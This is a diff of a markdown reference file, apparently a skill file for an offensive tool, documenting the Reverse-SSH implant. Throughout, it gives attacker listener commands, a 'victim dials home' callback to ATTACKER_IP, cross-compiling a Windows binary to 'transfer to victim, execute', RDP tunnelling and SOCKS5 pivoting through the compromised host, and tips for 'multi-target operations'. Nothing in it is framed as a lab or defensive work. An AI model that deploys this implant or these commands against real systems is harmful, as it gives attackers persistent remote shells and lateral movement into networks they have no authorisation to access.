@@ -10,32 +10,32 @@ metadata:
 
 # Reverse-SSH
 
-Reverse SSH tunnel implant — SSH shell through outbound connection, no port forwarding needed.
+Reverse SSH server/tunnel for resilient shell access when inbound connectivity to target is blocked.
 
 ## Quick Start
 
 ```bash
-# Attacker: start SSH server (any standard SSH server)
-# Default: binds on attacker port 8888
+# Attacker listener mode
+./reverse-ssh -l -p 31337
 
-# Victim: run reverse-ssh binary
-./reverse-ssh <attacker_ip>:<port>
+# Victim dials home
+./reverse-ssh -p 31337 <attacker-ip>
 
-# Attacker: connect back
-ssh -p 8888 localhost          # Interact with victim shell
-# Or list connected
-ssh -p 8888 127.0.0.1 ls
+# Attacker connects to reverse-bound shell port
+ssh -p 8888 127.0.0.1
 ```
 
 ## Common Flags
 
 | Flag | Purpose |
 |------|---------|
-| `-p PORT` | Local bind port on victim |
-| `--ssh-port N` | Attacker SSH server port |
-| `-l USER` | Login user |
+| `-l` | Listen mode (bind scenario) |
+| `-p PORT` | SSH port to listen/dial (default 31337) |
+| `-b PORT` | Reverse scenario bind port on attacker side (default 8888) |
+| `-s SHELL` | Shell to spawn (`/bin/bash`, cmd path hints, etc.) |
+| `-N` | Deny shell/exec/subsystem/local-forward requests |
 | `--socks5` | Enable SOCKS5 proxy |
-| `--foreground` | Don't daemonize |
+| `-v` | Verbose logs |
 
 ## Common Workflows
 
@@ -44,25 +44,30 @@ ssh -p 8888 127.0.0.1 ls
 # Compile for Windows target (from Linux)
 GOOS=windows GOARCH=amd64 go build -o rev.exe .
 # Transfer to victim, execute:
-rev.exe ATTACKER_IP:8888
+rev.exe -p 31337 ATTACKER_IP
 ```
 
 **Port forwarding via reverse SSH:**
 ```bash
-# From attacker, tunnel internal RDP
-ssh -p 8888 -L 3389:127.0.0.1:3389 localhost
+# From attacker, tunnel internal RDP over obtained SSH endpoint
+ssh -p 8888 -L 3389:127.0.0.1:3389 127.0.0.1
 # Connect RDP client to localhost:3389
 ```
 
 **SOCKS5 proxy:**
 ```bash
-./reverse-ssh --socks5 ATTACKER:8888
-# SSH with -D for SOCKS
-ssh -p 8888 -D 1080 localhost
+# Open SSH dynamic forwarding via recovered endpoint
+ssh -p 8888 -D 1080 127.0.0.1
 ```
+
+## Hardening Before Use
+
+- Replace default credentials at compile time (`RS_PASS`, `RS_PUB`).
+- Set explicit `BPORT` to avoid collisions during multi-target operations.
+- Use `-N` in listener-only workflows where shell execution is not required.
 
 ## Resources
 
 | File | When to load |
 |------|--------------|
-| `references/` | Persistence and cross-compile notes |
+| `references/deployment-and-hardening.md` | Precise port model (`-p` vs `-b`), hardened build flags, safer deployment patterns |
